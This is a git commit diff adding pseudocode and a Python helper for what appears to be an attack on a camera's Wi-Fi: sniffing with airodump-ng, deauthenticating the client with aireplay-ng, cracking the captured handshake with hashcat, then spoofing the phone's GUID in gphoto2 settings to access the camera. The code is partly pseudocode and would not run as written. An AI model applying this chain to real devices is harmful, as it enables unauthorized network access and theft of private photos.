a31bd8b4caae80a76aa7eaccb550661f1ca504aa
tpeyton <tpeyton25@gmail.com>
2018-04-05 20:34:18 -0400

    starting streamline process

--- connectToAP.py
+++ connectToAP.py
@@ -1,5 +1,14 @@
 #!/usr/bin/python3
 
+# file imports
+import guidTools, getAuthInfo
+
+# initialize variables
+phoneIP = "10.0.0.100"
+
+############ PSUEDOCODE #################################
+# Obtain network access
+# references https://www.aircrack-ng.org/doku.php?id=airodump-ng
 run airodump-ng on correct channel and mac n shit
 if station is blank
     print client is not connected, waiting for client to connected
@@ -7,7 +16,7 @@ else
     print client is already connected, attempting deauth
     aireplay-ng client
 while(aircrack exits with "no valid handshakes found, or no file or directory")
-
+############ PSUEDOCODE #################################
 
 # take captured cap and format for hashcat (old)
 aircrack-ng psk-01.cap -J output
@@ -19,3 +28,15 @@ cap2hccapx.bin /path/to/psk-01.cap /path/to/output.hccapx
     # output the found key
 
 # authenticate to the AP
+
+# determine phone and camera IP address
+
+# get guid from phone, if already connected we need to disconnect or getAuthInfo will fail
+rawGUID = getAuthInfo(phoneIP)
+
+# disconnect phone
+
+# set GUID in gphoto2 from phone
+setGUID(formatGUID(rawGUID))
+
+# connect to camera ip and run ptp stuff via gphoto2
---
+++ guidTools.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python
+import os
+
+def formatGUID(guid):
+    # remote hyphens from guid pulled from xml
+    guid = guid.translate(None, "-")
+
+    # format guid in colon form for gphoto2 settings file
+    guid = ':'.join([guid[i:i+2] for i in range(0, len(guid), 2)])
+
+    return guid
+
+def setGUID(guid):
+    # location of gphoto2 settings file
+    settingsPath = os.path.expanduser("~/Scripts/pictool/settings.conf")
+    tempSettingsPath = settingsPath + "2"
+
+    # open files needed
+    settings = open(settingsPath, "r")
+    tempSettings = open(tempSettingsPath, "a")
+
+    for line in settings:
+        if not line.startswith('ptp2_ip=guid='):
+            tempSettings.write(line)
+
+    # write new guid to file
+    tempSettings.write('ptp2_ip=guid=' + guid +'\n')
+
+    # close files after writing
+    settings.close()
+    tempSettings.close()
+
+    # delete old gphoto2 settings
+    os.remove(settingsPath)
+
+    # rename newSettings to settings
+    os.rename(tempSettingsPath,settingsPath)
+
+setGUID(formatGUID(rawGUID))
